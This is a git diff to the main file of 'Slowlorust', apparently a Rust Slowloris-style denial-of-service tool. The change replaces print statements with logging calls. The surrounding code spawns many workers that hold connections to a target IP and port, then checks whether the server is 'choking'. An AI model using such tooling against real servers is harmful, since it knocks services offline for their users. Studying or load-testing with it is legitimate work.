@@ -8,6 +8,8 @@ use std::net::TcpStream;
 use std::thread::sleep;
 use std::time::{Duration, Instant};
 use worker::Worker;
+#[macro_use]
+extern crate log;
 
 #[derive(Parser)]
 #[clap(version = "1.0", author = "Michael Van Leeuwen <michaeljvanleeuwen at gmail.com>")]
@@ -50,6 +52,7 @@ fn benchmark_connection(conn_str: &str, timeout: u8) -> Result<Duration, Error> 
 
 fn main() {
     let args = Slowlorust::parse();
+    colog::init();
 
     if args.lower_sleep >= args.upper_sleep {
         panic!("Error: sleep_min must be < sleep_max.")
@@ -57,36 +60,36 @@ fn main() {
 
     let conn_str = format!("{}:{}", args.ip, args.port);
     if let Ok(dur) = benchmark_connection(&conn_str, args.timeout) {
-        println!("Server is up. Connected in {}s ({} ns).", dur.as_secs(), dur.as_nanos());
+        info!("Server is up. Connected in {}s ({} ns).", dur.as_secs(), dur.as_nanos());
     } else {
         panic!("Connection failed. Is the server up?");
     }
 
-    println!("Starting workers...");
+    info!("Starting workers...");
     let mut pool = Pool::new(args.num_workers as u32);
     let mut num_workers = 0;
     pool.scoped(|scoped| {
         while num_workers < args.num_workers {
             if let Ok(mut worker) = Worker::new(num_workers, conn_str.clone(), (args.lower_sleep, args.upper_sleep), args.verbose) {
                 if args.verbose > 0 {
-                    println!("[slowlorust_{:03}] Spawned.", num_workers);
+                    info!("[slowlorust_{:03}] Spawned.", num_workers);
                 }
                 scoped.execute(move || {
                     worker.start();
                 });
                 num_workers += 1;
                 if num_workers % cmp::max(args.num_workers / 10, 1) == 0 {
-                    println!("\t{:03} workers spawned.", num_workers);
+                    println!(" | \t{:03} workers spawned.", num_workers);
                 }
             }
         }
-        println!("All workers spawned!");
+        info!("All workers spawned!");
 
-        println!("Starting connection benchmarking...");
+        info!("Starting connection benchmarking...");
         loop {
             match benchmark_connection(&conn_str, args.timeout) {
-                Ok(dur) => println!("\tServer response in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
-                Err(_) => println!("\tFailed to benchmark. Is the server choking?"),
+                Ok(dur) => info!("\tServer response in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
+                Err(_) => warn!("\tFailed to benchmark. Is the server choking?"),
             }
             sleep(Duration::from_secs(args.benchmark_delay as u64));
         }
